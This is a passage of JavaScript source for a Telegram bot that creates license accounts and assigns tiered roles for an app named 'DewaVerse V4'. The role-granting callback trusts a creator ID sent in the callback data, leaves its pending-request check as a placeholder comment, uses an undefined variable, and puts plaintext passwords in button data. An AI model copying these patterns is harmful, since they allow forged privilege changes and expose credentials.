        callback_data: `role_${username}_${password}_${telegramId}_${days}_member_${encodeURIComponent(inputType)}`
    };
    
    // Cek dan tampilkan RESELLER jika bisa dibuat
    let resellerButton = null;
    if (canCreateRole(creatorId, 'reseller')) {
        resellerButton = {
            text: "📊 RESELLER",
            callback_data: `role_${username}_${password}_${telegramId}_${days}_reseller_${encodeURIComponent(inputType)}`
        };
    }
    
    // Cek dan tampilkan VIP jika bisa dibuat
    let vipButton = null;
    if (canCreateRole(creatorId, 'vip')) {
        vipButton = {
            text: "⭐ VIP",
            callback_data: `role_${username}_${password}_${telegramId}_${days}_vip_${encodeURIComponent(inputType)}`
        };
    }
    
    // Cek dan tampilkan OWNER jika bisa dibuat (hanya untuk owner/developer)
    let ownerButton = null;
    if (creatorRole === 'owner' || creatorRole === 'developer') {
        ownerButton = {
            text: "👑 OWNER",
            callback_data: `role_${username}_${password}_${telegramId}_${days}_owner_${encodeURIComponent(inputType)}`
        };
    }
    
    // Atur layout tombol
    if (creatorRole === 'owner' || creatorRole === 'developer') {
        // Owner/Developer bisa buat semua role (unlimited)
        const row1 = [];
        const row2 = [];
        
        row1.push(
            {
                text: "👑 OWNER",
                callback_data: `role_${username}_${password}_${telegramId}_${days}_owner_${encodeURIComponent(inputType)}`
            },
            {
                text: "⭐ VIP",
                callback_data: `role_${username}_${password}_${telegramId}_${days}_vip_${encodeURIComponent(inputType)}`
            }
        );
        
        row2.push(
            {
                text: "📊 RESELLER",
                callback_data: `role_${username}_${password}_${telegramId}_${days}_reseller_${encodeURIComponent(inputType)}`
            },
            {
                text: "👤 MEMBER",
                callback_data: `role_${username}_${password}_${telegramId}_${days}_member_${encodeURIComponent(inputType)}`
            }
        );
        
        keyboard.inline_keyboard.push(row1, row2);
        
    } else {
        // Untuk VIP dan Reseller dengan limit
        const row1 = [];
        const row2 = [];
        
        if (vipButton) {
            row1.push(vipButton);
        }
        
        if (resellerButton) {
            if (row1.length < 2) {
                row1.push(resellerButton);
            } else {
                row2.push(resellerButton);
            }
        }
        
        // Tambahkan member button
        if (row1.length < 2) {
            row1.push(memberButton);
        } else {
            row2.push(memberButton);
        }
        
        if (row1.length > 0) keyboard.inline_keyboard.push(row1);
        if (row2.length > 0) keyboard.inline_keyboard.push(row2);
    }
    
    // Tambahkan informasi limit jika ada
    let limitInfo = "";
    if (creatorRole === 'vip' && !canCreateRole(creatorId, 'vip')) {
        limitInfo = "\n\n⚠️ <i>Anda sudah membuat akun VIP sebelumnya. Hanya bisa buat 1x.</i>";
    } else if (creatorRole === 'reseller' && !canCreateRole(creatorId, 'reseller')) {
        limitInfo = "\n\n⚠️ <i>Anda sudah membuat akun Reseller sebelumnya. Hanya bisa buat 1x.</i>";
    }
    
    // Tombol batalkan
    keyboard.inline_keyboard.push([
        {
            text: "❌ BATALKAN",
            callback_data: "cancel_creation"
        }
    ]);
    
    const finalMessage = roleMessage + limitInfo;
    
    bot.sendMessage(chatId, finalMessage, {
        parse_mode: "HTML",
        reply_markup: keyboard
    }).then(sentMsg => {
        // Auto delete pesan role selection setelah 2 menit
        setTimeout(() => {
            bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
        }, 120000);
    });
}

// Update command /ckey dengan validasi format yang lebih baik
bot.onText(/\/ckey(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!onlyPrivate(msg)) return;
    
    const userRole = getUserRole(userId);
    
    // Cek apakah user memiliki akses
    if (!userRole || (userRole !== 'reseller' && userRole !== 'vip' && userRole !== 'owner' && userRole !== 'developer')) {
        bot.sendMessage(chatId, "❌ Anda tidak memiliki akses untuk membuat akun!");
        return;
    }
    
    const input = match[1] ? match[1].trim() : '';
    
    // VALIDASI FORMAT
    if (!input) {
        // Tidak ada input, tampilkan cara penggunaan
        const usageMsg = await bot.sendMessage(chatId, 
            `<b>📌 CARA PENGGUNAAN /ckey</b>\n\n` +
            `<code>/ckey username,password</code>\n\n` +
            `<b>Contoh:</b>\n` +
            `<code>/ckey gupong,pong</code>\n\n` +
            `<i>• Username dan password dipisah dengan koma (,)\n` +
            `• Tanpa spasi setelah koma\n` +
            `• Minimal 3 karakter</i>`,
            { parse_mode: "HTML" }
        );
        
        setTimeout(() => {
            bot.deleteMessage(chatId, usageMsg.message_id).catch(() => {});
        }, 10000);
        return;
    }
    
    // Parse input
    const parts = input.split(',');
    
    // VALIDASI JUMLAH PARAMETER
    if (parts.length < 2) {
        const errorMsg = await bot.sendMessage(chatId, 
            `<b>❌ FORMAT SALAH!</b>\n\n` +
            `<code>/ckey username,password</code>\n\n` +
            `<b>Contoh yang benar:</b>\n` +
            `<code>/ckey gupong,pong</code>`,
            { parse_mode: "HTML" }
        );
        setTimeout(() => {
            bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
        }, 5000);
        return;
    }
    
    const username = parts[0].trim();
    const password = parts[1].trim();
    const targetTelegramId = parts[2] ? parts[2].trim() : userId.toString();
    
    // VALIDASI PANJANG USERNAME & PASSWORD
    if (username.length < 3 || password.length < 3) {
        const errorMsg = await bot.sendMessage(chatId, 
            `<b>❌ USERNAME / PASSWORD TERLALU PENDEK!</b>\n\n` +
            `Username dan password minimal <b>3 karakter</b>.\n\n` +
            `<code>/ckey ${username},${password}</code>\n` +
            `👤 Username: ${username.length} karakter (min 3)\n` +
            `🔒 Password: ${password.length} karakter (min 3)`,
            { parse_mode: "HTML" }
        );
        setTimeout(() => {
            bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
        }, 5000);
        return;
    }
    
    // Cek username sudah digunakan
    const db = loadDatabaseCached();
    if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
        const errorMsg = await bot.sendMessage(chatId, 
            `<b>❌ USERNAME SUDAH DIGUNAKAN!</b>\n\n` +
            `Username <code>${username}</code> sudah terdaftar.\n` +
            `Silahkan gunakan username lain.`,
            { parse_mode: "HTML" }
        );
        setTimeout(() => {
            bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
        }, 5000);
        return;
    }
    
    // Auto delete pesan command untuk VIP/Owner/Developer
    if (userRole === 'vip' || userRole === 'owner' || userRole === 'developer') {
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
    }
    
    // Tampilkan detail akun untuk pilihan expired
    const detailMessage = `
<b>📋 Detail Akun</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
⏰ Expired: <i>Pilih di bawah</i>
🔥 Role: Member

<b>Pilihan Expired Akun</b>
`;
    
    // Buat keyboard untuk pilihan expired berdasarkan role
    const expiredOptions = [];
    
    if (userRole === 'reseller' || userRole === 'owner' || userRole === 'vip' || userRole === 'developer') {
        expiredOptions.push(
            { text: "7 HARI", days: 7 },
            { text: "1 BULAN", days: 30 }
        );
    }
    
    if (userRole === 'owner' || userRole === 'developer') {
        expiredOptions.push(
            { text: "2 BULAN", days: 60 },
            { text: "3 BULAN", days: 90 },
            { text: "4 BULAN", days: 120 },
            { text: "✨ PERMANEN", days: 99999 }
        );
    }
    
    const keyboard = {
        inline_keyboard: []
    };
    
    // Buat 2 tombol per baris
    for (let i = 0; i < expiredOptions.length; i += 2) {
        const row = [];
        row.push({
            text: expiredOptions[i].text,
            callback_data: `expired_${username}_${password}_${targetTelegramId}_${expiredOptions[i].days}`
        });
        
        if (i + 1 < expiredOptions.length) {
            row.push({
                text: expiredOptions[i + 1].text,
                callback_data: `expired_${username}_${password}_${targetTelegramId}_${expiredOptions[i + 1].days}`
            });
        }
        
        keyboard.inline_keyboard.push(row);
    }
    
    // TOMBOL CUSTOM EXPIRED - HANYA untuk owner, developer dan VIP
    if (userRole === 'vip' || userRole === 'owner' || userRole === 'developer') {
        keyboard.inline_keyboard.push([
            {
                text: "🎯 CUSTOM EXPIRED",
                callback_data: `custom_${username}_${password}_${targetTelegramId}`
            }
        ]);
    }
    
    // Tombol batalkan
    keyboard.inline_keyboard.push([
        {
            text: "❌ BATALKAN",
            callback_data: "cancel_creation"
        }
    ]);
    
    const sentMsg = await bot.sendMessage(chatId, detailMessage, {
        parse_mode: "HTML",
        reply_markup: keyboard
    });
    
    // Auto delete pesan setelah 2 menit untuk VIP/Owner/Developer
    if (userRole === 'vip' || userRole === 'owner' || userRole === 'developer') {
        setTimeout(() => {
            bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
        }, 120000);
    }
});

// Command untuk owner menghapus semua akun expired
bot.onText(/^\/deleteexpired$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!onlyPrivate(msg)) return;
    
    const userRole = getUserRole(userId);
    if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
        bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
        return;
    }
    
    const db = loadDatabaseCached();
    const now = new Date();
    let deletedCount = 0;
    let deletedUsers = [];
    
    for (let i = db.length - 1; i >= 0; i--) {
        const user = db[i];
        const expiredDate = new Date(user.expiredDate);
        
        if (expiredDate < now) {
            deletedUsers.push(user.username);
            db.splice(i, 1);
            deletedCount++;
        }
    }
    
    if (deletedCount > 0) {
        saveDatabaseCached(db);
        
        // Hapus juga dari keyList.json
        try {
            const keyList = loadKeyList();
            const filteredKeyList = keyList.filter(k => !deletedUsers.includes(k.username));
            saveKeyList(filteredKeyList);
        } catch (e) {}
        
        bot.sendMessage(chatId, 
            `✅ <b>AKUN EXPIRED BERHASIL DIHAPUS!</b>\n\n` +
            `Total dihapus: ${deletedCount} akun\n\n` +
            `<b>Daftar akun yang dihapus:</b>\n` +
            deletedUsers.map(u => `• <code>${u}</code>`).join('\n'),
            { parse_mode: "HTML" }
        );
        
        // Log ke file
        const logLine = `[${new Date().toISOString()}] ${userId} (${userRole}) manually deleted ${deletedCount} expired accounts\n`;
        fs.appendFileSync('logUser.txt', logLine);
    } else {
        bot.sendMessage(chatId, "📭 Tidak ada akun expired yang ditemukan.", { parse_mode: "HTML" });
    }
});

// Command /delakun untuk menghapus akun
bot.onText(/\/delakun\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = match[1].trim();
    
    if (!onlyPrivate(msg)) return;
    
    const userRole = getUserRole(userId);
    
    // Cek apakah user memiliki akses (owner, developer, vip, reseller)
    if (!userRole || (userRole !== 'owner' && userRole !== 'developer' && userRole !== 'vip' && userRole !== 'reseller')) {
        bot.sendMessage(chatId, "❌ Anda tidak memiliki akses untuk menghapus akun!");
        return;
    }
    
    // Auto delete pesan command
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {}
    
    // Hapus akun
    const result = deleteUserAccount(username, userId);
    
    // Kirim hasil
    const resultMsg = await bot.sendMessage(chatId, result.message, {
        parse_mode: "HTML"
    });
    
    // Auto delete pesan hasil setelah 10 detik
    setTimeout(() => {
        bot.deleteMessage(chatId, resultMsg.message_id).catch(() => {});
    }, 10000);
});

bot.onText(/\/listakses/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  const userRole = getUserRole(userId);
  
  // Cek apakah user adalah developer, owner, atau staf
  if (!userRole) {
    bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
    return;
  }
  
  // Hanya developer, owner, dan staf yang bisa melihat daftar akses
  if (userRole !== 'developer' && userRole !== 'owner' && userRole !== 'staff') {
    bot.sendMessage(chatId, "❌ Hanya Developer, Owner, dan STAF yang bisa melihat daftar akses!");
    return;
  }
  
  // Load akses
  const akses = loadAkses();
  
  if (Object.keys(akses).length === 0) {
    bot.sendMessage(chatId, "📭 Belum ada user yang memiliki akses.");
    return;
  }
  
  let message = `<b>📋 DAFTAR AKSES PENGGUNA</b>\n\n`;
  let count = 1;
  
  // Urutkan berdasarkan role (developer/owner dulu)
  const sortedAkses = Object.entries(akses).sort((a, b) => {
    const roleOrder = { 'developer': 1, 'owner': 2, 'staff': 3, 'vip': 4, 'reseller': 5, 'member': 6 };
    return (roleOrder[a[1]] || 99) - (roleOrder[b[1]] || 99);
  });
  
  for (const [id, role] of sortedAkses) {
    message += `${count}. <code>${id}</code>\n`;
    message += `   Role: <b>${role.toUpperCase()}</b>\n`;
    
    // Cek apakah user ini pernah membuat akun (punya limit tracking)
    const hasCreatedVip = accountCreationTracker[id]?.hasCreatedVip ? "✅" : "❌";
    const hasCreatedReseller = accountCreationTracker[id]?.hasCreatedReseller ? "✅" : "❌";
    
    if (role === 'vip' || role === 'reseller' || role === 'owner' || role === 'developer' || role === 'staff') {
      message += `   Status: VIP:${hasCreatedVip} RES:${hasCreatedReseller}\n`;
    }
    
    message += `\n`;
    count++;
  }
  
  message += `Total: <b>${Object.keys(akses).length} user</b>`;
  
  bot.sendMessage(chatId, message, { 
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔄 REFRESH", callback_data: "refresh_akses_list" }
        ]
      ]
    }
  });
});

// ================== ADD ACCESS WITH BUTTONS (GROUP SUPPORT) ==================
bot.onText(/^\/addakses\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetId = match[1].trim();
  
  // Cek role user yang menjalankan command
  const userRole = getUserRole(userId);
  
  // Validasi apakah user memiliki akses
  if (!userRole) {
    return bot.sendMessage(chatId, "❌ Anda tidak memiliki akses!");
  }

  // Validasi role yang boleh menggunakan command ini
  const allowedRoles = ['developer', 'owner', 'vip', 'reseller'];
  if (!allowedRoles.includes(userRole)) {
    return bot.sendMessage(chatId, "❌ Hanya Developer, Owner, VIP dan Reseller yang bisa menambahkan akses!");
  }

  // Auto delete pesan command (untuk kebersihan chat)
  try {
    await bot.deleteMessage(chatId, msg.message_id);
  } catch (e) {}

  // Buat keyboard berdasarkan role
  const keyboard = createRoleKeyboard(userRole, targetId, userId);
  
  // Kirim pesan dengan button
  const sentMsg = await bot.sendMessage(
    chatId,
    `<b>🔐 TAMBAH AKSES PENGGUNA</b>\n\n` +
    `👤 <b>Target User:</b> <code>${targetId}</code>\n` +
    `👑 <b>Oleh:</b> ${msg.from.first_name || msg.from.username || 'Unknown'} (${userRole.toUpperCase()})\n\n` +
    `📌 <i>Pilih role yang ingin diberikan kepada user tersebut:</i>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard
      }
    }
  );

  // Simpan data sementara untuk validasi nanti
  if (!global.pendingAccess) global.pendingAccess = {};
  global.pendingAccess[`${chatId}_${sentMsg.message_id}`] = {
    creatorId: userId,
    targetId: targetId,
    creatorRole: userRole,
    timestamp: Date.now()
  };

  // Auto delete pesan button setelah 5 menit
  setTimeout(() => {
    try {
      bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
      if (global.pendingAccess?.[`${chatId}_${sentMsg.message_id}`]) {
        delete global.pendingAccess[`${chatId}_${sentMsg.message_id}`];
      }
    } catch (e) {}
  }, 300000); // 5 menit
});

// Fungsi untuk membuat keyboard berdasarkan role
// Fungsi untuk membuat keyboard berdasarkan role
function createRoleKeyboard(userRole, targetId, creatorId) {
  const keyboard = [];
  
  // Untuk DEVELOPER bisa menambah semua role termasuk STAF
  if (userRole === 'developer') {
    // Baris 1: OWNER dan VIP
    keyboard.push([
      {
        text: "👑 OWNER",
        callback_data: `addrole:owner:${targetId}:${creatorId}`
      },
      {
        text: "⭐ VIP",
        callback_data: `addrole:vip:${targetId}:${creatorId}`
      }
    ]);
    
    // Baris 2: RESELLER dan FULL UPDATE
    keyboard.push([
      {
        text: "📊 RESELLER",
        callback_data: `addrole:reseller:${targetId}:${creatorId}`
      },
      {
        text: "🔄 FULL UPDATE",
        callback_data: `addrole:full_update:${targetId}:${creatorId}`
      }
    ]);
    
    // Baris 3: STAF (khusus untuk developer)
    keyboard.push([
      {
        text: "👔 STAF",
        callback_data: `addrole:staff:${targetId}:${creatorId}`
      }
    ]);
  }
  
  // Untuk OWNER bisa menambah RESELLER, VIP, dan FULL UPDATE (tidak bisa STAF)
  else if (userRole === 'owner') {
    keyboard.push([
      {
        text: "📊 RESELLER",
        callback_data: `addrole:reseller:${targetId}:${creatorId}`
      },
      {
        text: "⭐ VIP",
        callback_data: `addrole:vip:${targetId}:${creatorId}`
      }
    ]);
    keyboard.push([
      {
        text: "🔄 FULL UPDATE",
        callback_data: `addrole:full_update:${targetId}:${creatorId}`
      }
    ]);
  }
  
  // Untuk VIP bisa menambah RESELLER dan FULL UPDATE
  else if (userRole === 'vip') {
    keyboard.push([
      {
        text: "📊 RESELLER",
        callback_data: `addrole:reseller:${targetId}:${creatorId}`
      },
      {
        text: "🔄 FULL UPDATE",
        callback_data: `addrole:full_update:${targetId}:${creatorId}`
      }
    ]);
  }
  
  // Untuk RESELLER hanya bisa menambah FULL UPDATE
  else if (userRole === 'reseller') {
    keyboard.push([
      {
        text: "🔄 FULL UPDATE",
        callback_data: `addrole:full_update:${targetId}:${creatorId}`
      }
    ]);
  }
  
  // Baris terakhir: Tombol BATAL
  keyboard.push([
    {
      text: "❌ BATALKAN",
      callback_data: `addrole:cancel:${targetId}:${creatorId}`
    }
  ]);
  
  return keyboard;
}

// Handler untuk callback query addrole (PERBAIKAN: Mencegah VIP menurunkan role)
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  
  // Hanya handle untuk addrole
  if (!data.startsWith('addrole:')) return;
  
  const parts = data.split(':');
  const action = parts[1]; // owner/vip/reseller/cancel/full_update/staff
  const targetId = parts[2];
  const creatorId = parseInt(parts[3]);
  
  // ... validasi pending data ...
  
  // Handle CANCEL (sama seperti sebelumnya)
  if (action === 'cancel') {
    // ... kode cancel ...
    return;
  }
  
  // Proses penambahan role
  const creatorRole = getUserRole(creatorId);
  const normalizedRole = action; // owner/vip/reseller/full_update/staff
  
  // ===== VALIDASI KHUSUS UNTUK STAF =====
  // STAF hanya bisa dibuat oleh DEVELOPER
  if (normalizedRole === 'staff') {
    if (creatorRole !== 'developer') {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Hanya DEVELOPER yang bisa menambah role STAF!",
        show_alert: true
      });
      
      bot.sendMessage(
        chatId,
        `<b>⚠️ AKSES DITOLAK!</b>\n\n` +
        `Role <b>STAF</b> hanya bisa ditambahkan oleh <b>DEVELOPER</b>!\n` +
        `Silahkan hubungi developer jika ingin mendapatkan role STAF.`,
        { parse_mode: "HTML" }
      );
      
      // Hapus pesan button
      try {
        await bot.deleteMessage(chatId, messageId);
        delete global.pendingAccess[pendingKey];
      } catch (e) {}
      return;
    }
  }
  
  // ===== VALIDASI UNTUK STAF YANG MENAMBAH AKSES =====
  // Jika yang menambah adalah STAF, cek apakah dia bisa menambah role tersebut
  if (creatorRole === 'staff') {
    // STAF bisa menambah: OWNER, VIP, RESELLER, FULL UPDATE
    const allowedRoles = ['owner', 'vip', 'reseller', 'full_update'];
    
    if (!allowedRoles.includes(normalizedRole)) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: `❌ STAF tidak bisa menambah role ${normalizedRole.toUpperCase()}!`,
        show_alert: true
      });
      
      bot.sendMessage(
        chatId,
        `<b>⚠️ AKSES DITOLAK!</b>\n\n` +
        `Role <b>STAF</b> hanya bisa menambah role:\n` +
        `• OWNER\n` +
        `• VIP\n` +
        `• RESELLER\n` +
        `• FULL UPDATE\n\n` +
        `Tidak bisa menambah role STAF atau yang lainnya.`,
        { parse_mode: "HTML" }
      );
      
      try {
        await bot.deleteMessage(chatId, messageId);
        delete global.pendingAccess[pendingKey];
      } catch (e) {}
      return;
    }
  }
  
  // ... lanjutkan dengan validasi lainnya ...
  
  // Load akses yang ada
  const akses = loadAkses();
  const currentTargetRole = akses[targetId];
  
  // PERBAIKAN: Jika target sudah memiliki role, cek apakah role baru lebih rendah
  if (currentTargetRole) {
    const roleHierarchy = {
      'developer': 1,
      'owner': 2,
      'vip': 3,
      'reseller': 4,
      'staff': 5,      // Tambahkan STAF ke hierarki
      'full_update': 6,
      'member': 7
    };
    
    const currentRank = roleHierarchy[currentTargetRole] || 99;
    const newRank = roleHierarchy[normalizedRole] || 99;
    
    // Jika role baru lebih rendah (angka lebih besar) dari role saat ini
    if (newRank > currentRank) {
      // Hanya developer yang bisa menurunkan role
      if (creatorRole !== 'developer') {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `❌ Hanya DEVELOPER yang bisa menurunkan role ${currentTargetRole.toUpperCase()} ke ${normalizedRole.toUpperCase()}!`,
          show_alert: true
        });
        
        bot.sendMessage(
          chatId,
          `<b>⚠️ AKSES DITOLAK!</b>\n\n` +
          `Role saat ini: <b>${currentTargetRole.toUpperCase()}</b>\n` +
          `Role baru: <b>${normalizedRole.toUpperCase()}</b>\n\n` +
          `Hanya <b>DEVELOPER</b> yang bisa menurunkan role pengguna lain!\n` +
          `Silahkan hubungi developer jika ingin mengubah role.`,
          { parse_mode: "HTML" }
        );
        return;
      }
    }
  }
  
  // Validasi: RESELLER hanya bisa menambah FULL UPDATE
  if (creatorRole === 'reseller' && normalizedRole !== 'full_update') {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ RESELLER hanya bisa menambah akses FULL UPDATE!",
      show_alert: true
    });
    return;
  }
  
  // Validasi: VIP hanya bisa menambah RESELLER dan FULL UPDATE
  if (creatorRole === 'vip' && normalizedRole !== 'reseller' && normalizedRole !== 'full_update') {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ VIP hanya bisa menambah akses RESELLER dan FULL UPDATE!",
      show_alert: true
    });
    return;
  }
  
  // Validasi: OWNER bisa menambah RESELLER, VIP, dan FULL UPDATE (tidak bisa OWNER)
  if (creatorRole === 'owner' && normalizedRole === 'owner') {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "❌ OWNER tidak bisa menambah role OWNER! Hanya DEVELOPER yang bisa.",
      show_alert: true
    });
    return;
  }
  
  // Role yang dilarang untuk diubah oleh selain developer (OWNER, VIP, STAF)
  const protectedRoles = ['vip', 'owner', 'staff'];
  
  // PERBAIKAN: Jika target memiliki role protected dan creator bukan developer, tolak
  if (protectedRoles.includes(currentTargetRole) && creatorRole !== 'developer') {
    const roleNames = { vip: 'VIP', owner: 'OWNER', staff: 'STAF' };
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: `❌ Tidak bisa mengubah role ${roleNames[currentTargetRole]}! Hanya Developer yang bisa.`,
      show_alert: true
    });
    return;
  }
  
  // Simpan role baru
  akses[targetId] = normalizedRole;
  saveAkses(akses);
  
  // Hapus pesan button
  try {
    await bot.deleteMessage(chatId, messageId);
    delete global.pendingAccess[pendingKey];
  } catch (e) {}
  
  // Kirim pesan sukses dengan nama role yang benar
  const roleNames = {
    owner: 'OWNER',
    vip: 'VIP',
    reseller: 'RESELLER',
    full_update: 'FULL UPDATE',
    staff: 'STAF'
  };
  
  const roleDescriptions = {
    owner: '👑 Akses penuh ke semua fitur termasuk addakses dan ckey',
    vip: '⭐ Akses VIP, bisa membuat akun member dan addakses (RESELLER & FULL UPDATE)',
    reseller: '📊 Akses reseller, bisa membuat akun member dan addakses (FULL UPDATE saja)',
    full_update: '🔄 Role khusus, hanya bisa membuat akun pribadi dengan role MEMBER (Permanent) dan menghapus akun sendiri',
    staff: '👔 Role Staf, bisa addakses (OWNER, VIP, RESELLER, FULL UPDATE) dan membuat/menghapus akun pribadi'
  };
  
  let successMessage = `
<b>✅ AKSES BERHASIL DITAMBAHKAN!</b>

━━━━━━━━━━━━━━━━━━━
📱 <b>ID Target:</b> <code>${targetId}</code>
👑 <b>Role Baru:</b> <b>${roleNames[normalizedRole]}</b>
📝 <b>Deskripsi:</b> ${roleDescriptions[normalizedRole]}
👤 <b>Ditambahkan Oleh:</b> @${callbackQuery.from.username || 'User'} (${creatorRole.toUpperCase()})
━━━━━━━━━━━━━━━━━━━

<i>User sekarang dapat mengakses bot dengan role ${roleNames[normalizedRole]}.</i>
`;

  // Tambahkan peringatan jika role diturunkan
  if (currentTargetRole && currentTargetRole !== normalizedRole) {
    const oldRoleName = roleNames[currentTargetRole] || currentTargetRole.toUpperCase();
    successMessage = `
<b>✅ AKSES BERHASIL DIUPDATE!</b>

━━━━━━━━━━━━━━━━━━━
📱 <b>ID Target:</b> <code>${targetId}</code>
🔄 <b>Role Lama:</b> <b>${oldRoleName}</b>
👑 <b>Role Baru:</b> <b>${roleNames[normalizedRole]}</b>
📝 <b>Deskripsi:</b> ${roleDescriptions[normalizedRole]}
👤 <b>Diupdate Oleh:</b> @${callbackQuery.from.username || 'User'} (${creatorRole.toUpperCase()})
━━━━━━━━━━━━━━━━━━━

<i>Role pengguna telah diubah.</i>
`;
  }

  bot.sendMessage(chatId, successMessage, { parse_mode: "HTML" });
  
  // Log ke file
  const logLine = `[${new Date().toISOString()}] ADD ACCESS: ${creatorId} (${creatorRole}) added ${targetId} as ${normalizedRole} (previous: ${currentTargetRole || 'none'})\n`;
  fs.appendFileSync('logUser.txt', logLine);
  
  // Kirim notifikasi ke target user
  try {
    const roleEmoji = {
      'owner': '👑',
      'vip': '⭐',
      'reseller': '📊',
      'full_update': '🔄',
      'staff': '👔'
    };
    
    bot.sendMessage(
      targetId,
      `<b>🔔 AKSES ANDA TELAH DIUPDATE!</b>\n\n` +
      `Role baru Anda: <b>${roleEmoji[normalizedRole] || ''} ${roleNames[normalizedRole]}</b>\n\n` +
      `<b>📋 Fitur yang tersedia:</b>\n${roleDescriptions[normalizedRole]}\n\n` +
      `Gunakan /start untuk memulai.`,
      { parse_mode: "HTML" }
    ).catch(() => {}); // Abaikan error jika user tidak bisa dihubungi
  } catch (e) {}
});

// Panggil fungsi inisialisasi saat bot start
initializeAksesFile();

// Tambahkan command untuk cek semua akun (owner only)
bot.onText(/\/listusers/, (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from.id;

  // Cek apakah owner atau developer
  const akses = loadAkses();
  if (akses[telegramId] !== "developer" && akses[telegramId] !== "owner") {
    return bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
  }

  const db = loadDatabaseCached();

  if (db.length === 0) {
    return bot.sendMessage(chatId, "📭 Database kosong.");
  }

  let message = `📊 <b>DAFTAR SEMUA AKUN</b>\n\n`;
  let count = 1;

  for (const user of db) {
    const expired = new Date(user.expiredDate);
    const now = new Date();
    const daysLeft = Math.ceil((expired - now) / (1000 * 60 * 60 * 24));

    message += `${count}. <code>${user.username}</code>\n`;
    message += `   Role: ${user.role} | Sisa: ${daysLeft} hari\n`;
    message += `   Exp: ${user.expiredDate}\n`;
    message += `   Status: ${user.status || 'active'}\n\n`;
    count++;
  }

  message += `Total: <b>${db.length} akun</b>`;

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

// ================== INFO SYSTEM ==================
// Database untuk menyimpan informasi
const INFO_FILE = path.join(__dirname, 'info_messages.json');

// Load info messages
function loadInfoMessages() {
  try {
    if (fs.existsSync(INFO_FILE)) {
      return JSON.parse(fs.readFileSync(INFO_FILE, 'utf8'));
    }
  } catch (e) {
    logError('[❌ INFO] Gagal load info messages:', e.message);
  }
  return [];
}

// Save info messages
function saveInfoMessages(messages) {
  try {
    fs.writeFileSync(INFO_FILE, JSON.stringify(messages, null, 2));
    logDebug(`[📝 INFO] ${messages.length} messages saved`);
  } catch (e) {
    logError('[❌ INFO] Gagal save info messages:', e.message);
  }
}

// Initialize info file
if (!fs.existsSync(INFO_FILE)) {
  const initialInfo = [
    {
      id: crypto.randomBytes(8).toString('hex'),
      tag: 'PERATURAN',
      message: 'Dilarang Menjual Belikan Apk Jika Bukan Reseller Dan Vip',
      createdAt: new Date().toISOString(),
      createdBy: 'DEVELOPER',
      createdByName: 'DEVELOPER'
    },
    {
      id: crypto.randomBytes(8).toString('hex'),
      tag: 'PENGUMUMAN',
      message: 'Selamat datang Di DewaVerse V4',
      createdAt: new Date().toISOString(),
      createdBy: 'DEVELOPER',
      createdByName: 'DEVELOPER'
    }
  ];
  saveInfoMessages(initialInfo);
}

// Endpoint untuk mendapatkan semua info messages
app.get("/getInfoMessages", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const infoMessages = loadInfoMessages();
  
  // Sort by newest first
  infoMessages.sort((a, b) => 
    new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );

  res.json({
    valid: true,
    messages: infoMessages
  });
});

// Command Telegram: /info tag,message
bot.onText(/^\/info\s+([^,]+),\s*(.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!onlyPrivate(msg)) return;
  
  // Cek akses - hanya owner/developer yang bisa
  const userRole = getUserRole(userId);
  if (!userRole || (userRole !== 'owner' && userRole !== 'developer')) {
    bot.sendMessage(chatId, "❌ Hanya Owner dan Developer yang bisa menggunakan command ini!");
    return;
  }

  const tag = match[1].trim().toUpperCase();
  const message = match[2].trim();
  
  // Validasi
  if (tag.length < 3 || tag.length > 50) {
    bot.sendMessage(chatId, "❌ Tag harus 3-50 karakter!");
    return;
  }
  
  if (message.length < 5 || message.length > 500) {
    bot.sendMessage(chatId, "❌ Pesan harus 5-500 karakter!");
    return;
  }

  // Cek duplikat dalam 5 menit terakhir untuk tag yang sama
  const infoMessages = loadInfoMessages();
  const recentDuplicate = infoMessages.find(m => 
    m.tag === tag && 
    m.message === message &&
    (Date.now() - new Date(m.createdAt).getTime()) < 300000
  );

  if (recentDuplicate) {
    bot.sendMessage(chatId, "❌ Pesan yang sama sudah dikirim dalam 5 menit terakhir!");
    return;
  }

  // Buat info baru
  const newInfo = {
